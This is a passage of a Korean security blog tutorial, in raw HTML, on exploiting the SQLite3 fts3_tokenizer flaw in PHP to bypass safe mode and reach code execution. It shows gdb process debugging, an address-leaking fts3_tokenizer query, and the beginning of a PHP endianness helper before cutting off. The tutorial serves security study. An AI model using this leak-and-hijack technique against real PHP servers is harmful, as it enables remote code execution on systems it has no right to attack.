환경에서 PHP를 사용하고 있으며 이에 대한 공격 벡터가 존재하는 경우 PHP sandbox를 우회하기 위해 SQLite 모듈을 활용하고, 최종적으로 RCE를 수행하는 과정에 대해서 설명하도록 하겠습니다.</li>\n</ul>\n<h3 id=\"php-debugging\" style=\"position:relative;\"><a href=\"#php-debugging\" aria-label=\"php debugging permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PHP Debugging</h3>\n<ul>\n<li>취약한 모듈을 분석하기 위해 php+apache 디버깅을 활용하여 동적 분석을 진행한다.</li>\n</ul>\n<p><strong>gdb를 활용하여 process debugging 진행</strong></p>\n<ul>\n<li>대상 PID를 gdb로 연결하기 위해 <code class=\"language-text\">getmypid</code> 출력을 한후 sleep 함수를 사용해 유효 상태로 대기시키는 동안 연결을 진행하도록 합니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\t<span class=\"token keyword\">echo</span> <span class=\"token function\">getmypid</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span></code></pre></div>\n<ul>\n<li>구현된 코드를 실행한 후 출력된 PID 를 gdb에 연결을 진행한다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token punctuation\">[</span>root@localhost html<span class=\"token punctuation\">]</span><span class=\"token comment\"># curl http://localhost/dbg.php</span>\n<span class=\"token number\">1876</span></code></pre></div>\n<ul>\n<li><code class=\"language-text\">p</code> 옵션을 활용하여 PID 번호 매칭하여 디버깅을 진행합니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\">gdb <span class=\"token operator\">-</span>p <span class=\"token punctuation\">[</span>pid<span class=\"token punctuation\">]</span></code></pre></div>\n<ul>\n<li>구현된 환경에서 gdb를 활용하여 프로세스 디버깅 상태가 완료된 것을 확인할 수 있다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 18.333333333333336%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAvUlEQVQY012ObQuCQBCEL1MrKj297FUzNcq004IsI/r/P2tiFyLpwzDssvvMiEN+wy6tkO4vSLIawSKDIyP4swSj8RK9vkTf8mHaikWzYXrs1kDBUzGmbgjXi9hFqVvU1zfO1RPFuQUF5MWdRUGkTXTioImz/gPO4MiQ3R4G7KKsntD1C3nR4Fg07HGqsQpzqCDBVIacTKKmXaBp+zBMCWG4PJO44al8gMDbRHOj+XLPafTYPf7CfkDF0O7+A385ZDlcDFOsAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/2e73bb069d875686184fee6edfb89f4e/37523/1.png\"\n        srcset=\"/static/2e73bb069d875686184fee6edfb89f4e/e9ff0/1.png 180w,\n/static/2e73bb069d875686184fee6edfb89f4e/f21e7/1.png 360w,\n/static/2e73bb069d875686184fee6edfb89f4e/37523/1.png 720w,\n/static/2e73bb069d875686184fee6edfb89f4e/302a4/1.png 1080w,\n/static/2e73bb069d875686184fee6edfb89f4e/511f0/1.png 1172w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>해당 Process 매핑된 라이브러리 주소를 확인하여 오프셋 계산을 통해 ROP 기법을 수행할 수 있다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 15%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAoklEQVQI112Oyw6CMBREEXQNLW8ILdAiIGBBE2Mw/v9njemNC+Nikrs4c+44l/mJ2ezo+jtUt8Fsb7R6pXsxOxplYJkoUXBcH+6R4eAF8E4MARcI45bCoxo+q+Bc1xcVRbOgqEYSsbCGqGcM0wNxqiCbBVlx/hNy5OVAXCUnCjG6v1HBFu2XNO8QhBJxqlFWI3wmkGSa1ljRrzDg8ruwoVjmA2MTT0rI5KL2AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/ea0209ba4d4d2b05b0894abe7777af8b/37523/2.png\"\n        srcset=\"/static/ea0209ba4d4d2b05b0894abe7777af8b/e9ff0/2.png 180w,\n/static/ea0209ba4d4d2b05b0894abe7777af8b/f21e7/2.png 360w,\n/static/ea0209ba4d4d2b05b0894abe7777af8b/37523/2.png 720w,\n/static/ea0209ba4d4d2b05b0894abe7777af8b/eac55/2.png 887w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>여기까지 간단하게 gdb를 사용해 동적 프로세스 디버깅을 진행하였다. 다음은 실제 취약한 sqlite3 모듈을 분석하여 <code class=\"language-text\">Code Execution</code>이 가능한 부분을 exploitation 하도록 할께요</li>\n</ul>\n<h3 id=\"safe-mode-bypass\" style=\"position:relative;\"><a href=\"#safe-mode-bypass\" aria-label=\"safe mode bypass permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Safe Mode Bypass</h3>\n<ul>\n<li>PHP가 사용하는 모듈에 대한 취약점을 활용하여 Code Execution 을 진행해 System 함수를 실행하는 게 목표</li>\n<li><code class=\"language-text\">Code Execution</code> 을 수행하는데 있어서 Use-After-Free, Buffer-OverFlow 등 많은 CVE들이 존재하며 다음 <code class=\"language-text\">CVE-2015-0273</code>, <code class=\"language-text\">CVE-2015-6834</code> 등이 있습니다.</li>\n</ul>\n<p><a href=\"https://www.cve.org/CVERecord?id=CVE-2015-0273\">CVE-2015-0273</a></p>\n<p><a href=\"https://www.cve.org/CVERecord?id=CVE-2015-6834\">CVE-2015-6834</a></p>\n<ul>\n<li>PHP 모듈에 존재하는 취약점을 이용하여 PHP 버전에 의존하지 않고 Exploitation을 진행할 수 있습니다.</li>\n</ul>\n<h3 id=\"php-sqlite-모듈-php-53\" style=\"position:relative;\"><a href=\"#php-sqlite-%EB%AA%A8%EB%93%88-php-53\" aria-label=\"php sqlite 모듈 php 53 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PHP SQLite 모듈 (PHP 5.3≥)</h3>\n<ul>\n<li>이번에는 SQLite 모듈에 대한 취약점 분석을 진행하도록 하겠습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 27.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA/klEQVQY03VQXW+CQBC8+kF9KkgPTuCOO4FCAbHGaGtN+tLE//+TptmNktakD5Pbm83Ozqw4vH+jG07QeYeq3qOodpBxgaY9oOmOSLKGucy0EBMfk9mSQXUoHXK3gV0PI8TH+YKmPWKV1jC2ZzwFBrYY4Iot4lXFnEpe/gg+TAP4S8MLU/06QpzOF/TDJwu6cstuIlWxWwIJkTD17x0GoWXnlE7bHlneQez2X1iXbzxo3ObqULMIIVIlc/GdQ6r9MEeqW15GouRW0P1oUF1JGqbb0D2Il6rk7RT9v8gqqTkup6CYM+8Z80fJ8BaS/94iYtx69JLIb8HpPBznbvgB8BObv94Ag/QAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/852cfb2ec664976c43bbe2f6bf79fae4/37523/3.png\"\n        srcset=\"/static/852cfb2ec664976c43bbe2f6bf79fae4/e9ff0/3.png 180w,\n/static/852cfb2ec664976c43bbe2f6bf79fae4/f21e7/3.png 360w,\n/static/852cfb2ec664976c43bbe2f6bf79fae4/37523/3.png 720w,\n/static/852cfb2ec664976c43bbe2f6bf79fae4/84cc5/3.png 898w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 386px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 21.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA5UlEQVQY002N0W6CQBREt2qpNlZbq8QKIVRAYGFZYNmyimJbk/7/H03DfWj6cDKTm5szLM1aFNUZsrqA54Z6XhyRCYPV2qd+SBqUqkecauzDEqPJC+7Gz5QD4/vVH8x0P/gwN3r0gwLa3EgeHmr4+wJBVNLIfLHDxHqFNd2QbICNlsT/zkTZoW6ueHNieO+C5GneYuvEyMQRrschZAcuDGR9oSzrHvOFA2u2wfTRpqGHmU1jLEoUlP4iodKfcDyOmGvo9htVc0WleuzchG5DF/IEWZ2RcI1cnhDFCvY2xNoO8LR08QtnvnCMjsUBkwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/328a6c8043a5dfeb4cb733617a66114b/7bc0b/4.png\"\n        srcset=\"/static/328a6c8043a5dfeb4cb733617a66114b/e9ff0/4.png 180w,\n/static/328a6c8043a5dfeb4cb733617a66114b/f21e7/4.png 360w,\n/static/328a6c8043a5dfeb4cb733617a66114b/7bc0b/4.png 386w\"\n        sizes=\"(max-width: 386px) 100vw, 386px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>취약한 PHP 모듈의 SQLite3 버전은 3.6.20에 해당하며 이는 PHP 5.3 이상 부터 사용가능합니다.</li>\n</ul>\n<h1 id=\"sqlite3-fts3_tokenizer-취약점\" style=\"position:relative;\"><a href=\"#sqlite3-fts3_tokenizer-%EC%B7%A8%EC%95%BD%EC%A0%90\" aria-label=\"sqlite3 fts3_tokenizer 취약점 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SQLite3 fts3_tokenizer 취약점</h1>\n<h3 id=\"fts3_tokenizer-overview\" style=\"position:relative;\"><a href=\"#fts3_tokenizer-overview\" aria-label=\"fts3_tokenizer overview permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>fts3_tokenizer Overview</h3>\n<ul>\n<li>sqlite3에서 fts3_tokenizer를 통한 검색을 위해 사용자 정의 <code class=\"language-text\">tokenizer</code> 를 등록할 수 있는 함수가 있습니다.</li>\n<li>fts3, 4 확장 모듈을 통해 사용자는 데이터베이스에 등록된 특수 테이블인 fts 테이블을 생성할 수 있습니다.</li>\n<li>데이터베이스내의 테이블에 대용량 문서가 많이 포함된 경우에도 하나 이상의 <code class=\"language-text\">token</code> 이 포함된 모든 행에 대해 데이터베이스를 효과적으로 쿼리 수행할 수 있습니다.</li>\n</ul>\n<aside>\n💡 SQLite FTS3,4 Document\n> [https://www.sqlite.org/fts3.html](https://www.sqlite.org/fts3.html)\n</aside>\n<h3 id=\"sqlite-fts3-기능을-활용한-검색-방안\" style=\"position:relative;\"><a href=\"#sqlite-fts3-%EA%B8%B0%EB%8A%A5%EC%9D%84-%ED%99%9C%EC%9A%A9%ED%95%9C-%EA%B2%80%EC%83%89-%EB%B0%A9%EC%95%88\" aria-label=\"sqlite fts3 기능을 활용한 검색 방안 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SQLite fts3 기능을 활용한 검색 방안</h3>\n<ul>\n<li>SQLite3 쿼리 수행시 Virtual Index Table을 생성하고 요소들을 추가하면서 인덱스를 생성합니다.</li>\n<li>생성된 인덱스(Token)를 <code class=\"language-text\">MATCH</code> 쿼리로 키워드를 검색합니다.</li>\n<li>SQLite는 Simple Tokenizer를 사용합니다.</li>\n</ul>\n<h3 id=\"사용자가-지정할-수-있는-tokenizer의-callback-처리-방식\" style=\"position:relative;\"><a href=\"#%EC%82%AC%EC%9A%A9%EC%9E%90%EA%B0%80-%EC%A7%80%EC%A0%95%ED%95%A0-%EC%88%98-%EC%9E%88%EB%8A%94-tokenizer%EC%9D%98-callback-%EC%B2%98%EB%A6%AC-%EB%B0%A9%EC%8B%9D\" aria-label=\"사용자가 지정할 수 있는 tokenizer의 callback 처리 방식 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>사용자가 지정할 수 있는 tokenizer의 Callback 처리 방식</h3>\n<ul>\n<li>\n<p><code class=\"language-text\">xCreate</code> : Initialization</p>\n</li>\n<li>\n<p><code class=\"language-text\">xDestory</code> : destruction</p>\n</li>\n<li>\n<p><code class=\"language-text\">xOpen</code> : create a new tokenize cursor from a user input</p>\n</li>\n<li>\n<p><code class=\"language-text\">xClose</code> : close the cursor</p>\n</li>\n<li>\n<p><code class=\"language-text\">xNext</code> : yield next word</p>\n</li>\n<li>\n<p>callback function pointer 는 <code class=\"language-text\">sqlite3_tokenizer_module</code> 구조체에 등록되어 있습니다.</p>\n</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\">struct sqlite3_tokenizer_module <span class=\"token punctuation\">{</span>\n <span class=\"token keyword type-declaration\">int</span> iVersion<span class=\"token punctuation\">;</span>\n <span class=\"token keyword type-declaration\">int</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>xCreate<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-declaration\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> char <span class=\"token operator\">*</span> <span class=\"token keyword\">const</span> <span class=\"token operator\">*</span>argv<span class=\"token punctuation\">,</span> sqlite3_tokenizer <span class=\"token operator\">**</span>ppTokenizer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n <span class=\"token keyword type-declaration\">int</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>xDestroy<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>sqlite3_tokenizer <span class=\"token operator\">*</span>pTokenizer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n <span class=\"token keyword type-declaration\">int</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>xOpen<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>sqlite3_tokenizer <span class=\"token operator\">*</span>pTokenizer<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> char <span class=\"token operator\">*</span>pInput<span class=\"token punctuation\">,</span> <span class=\"token keyword type-declaration\">int</span> nBytes<span class=\"token punctuation\">,</span> sqlite3_tokenizer_cursor <span class=\"token operator\">**</span>ppCursor<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n <span class=\"token keyword type-declaration\">int</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>xClose<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>sqlite3_tokenizer_cursor <span class=\"token operator\">*</span>pCursor<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n <span class=\"token keyword type-declaration\">int</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>xNext<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>sqlite3_tokenizer_cursor <span class=\"token operator\">*</span>pCursor<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> char <span class=\"token operator\">**</span>ppToken<span class=\"token punctuation\">,</span> <span class=\"token keyword type-declaration\">int</span> <span class=\"token operator\">*</span>pnBytes<span class=\"token punctuation\">,</span> <span class=\"token keyword type-declaration\">int</span> <span class=\"token operator\">*</span>piStartOffset<span class=\"token punctuation\">,</span> <span class=\"token keyword type-declaration\">int</span> <span class=\"token operator\">*</span>piEndOffset<span class=\"token punctuation\">,</span> <span class=\"token keyword type-declaration\">int</span> <span class=\"token operator\">*</span>piPosition<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span></code></pre></div>\n<h2 id=\"sqlite-fts3-취약점\" style=\"position:relative;\"><a href=\"#sqlite-fts3-%EC%B7%A8%EC%95%BD%EC%A0%90\" aria-label=\"sqlite fts3 취약점 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SQLite fts3 취약점</h2>\n<h3 id=\"fts3-module-base-address-leaked\" style=\"position:relative;\"><a href=\"#fts3-module-base-address-leaked\" aria-label=\"fts3 module base address leaked permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>fts3 module base address leaked</h3>\n<ul>\n<li>sqlite3 에는 <code class=\"language-text\">simple</code>, <code class=\"language-text\">porter</code>, <code class=\"language-text\">unicode64</code> … 과 같은 몇 가지의 build-in tokenizer가 있습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\">select <span class=\"token function\">hex</span><span class=\"token punctuation\">(</span><span class=\"token function\">fts3_tokenizer</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'simple'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t\t\t\t↑\n\t\t\t\t\t<span class=\"token number\">16</span> 진수 문자열 반환 <span class=\"token punctuation\">(</span>빅 엔디안 주소<span class=\"token punctuation\">)</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 653px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 20.555555555555554%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAq0lEQVQY04WPTQuCQBRFRy2IQEeDSrLR/JhqUtHMsCKxRSv///+5MRO1CKrF4b7NPY9L+OYAkTbYiCN2+QkeE4iSEixIQR0GolMQzVJohq3QB847PyEx38NfZZAZ8VIhn6y3tSIIc1DHh2UzjMZzGMPJV5kSZsUFbdejqm+4dj2a8x1hXCipyBqFlEr5ggmY1PstlOWyajFzOaZuAsteghDzOVPm65bo9O/kB8BLZIICcAz5AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/73ef98fe51fcd96c8b7e866a34e2860f/e7dce/5.png\"\n        srcset=\"/static/73ef98fe51fcd96c8b7e866a34e2860f/e9ff0/5.png 180w,\n/static/73ef98fe51fcd96c8b7e866a34e2860f/f21e7/5.png 360w,\n/static/73ef98fe51fcd96c8b7e866a34e2860f/e7dce/5.png 653w\"\n        sizes=\"(max-width: 653px) 100vw, 653px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li><code class=\"language-text\">fts_tokenizer</code> 는 등록된 tokenizer의 주소를 <code class=\"language-text\">BLOB</code> 인코딩되어 반환하게 되고 built-in-tokenizer를 Query 하게 되면 lib-sqlite3 라이브러리 메모리 영역의 주소가 노출됩니다.</li>\n<li>해당 주소를 기반으로 ASAR을 우회하기 위해 리틀 엔디안으로 변환 작업을 진행합시다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">flip</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$val</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token variable\">$len</span> <span class=\"token operator\">=</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$val</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$len</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">></span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">-=</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token variable\">$result</span> <span class=\"token operator\">.=</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$val</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n  <span class=\"token variable\">$result</span> <span class=\"token operator\">.=</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$val</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$i</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token variable\">$result</span> <span class=\"token operator\">.=</span> <span class=\"token function\">str_repeat</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'0'</span><span 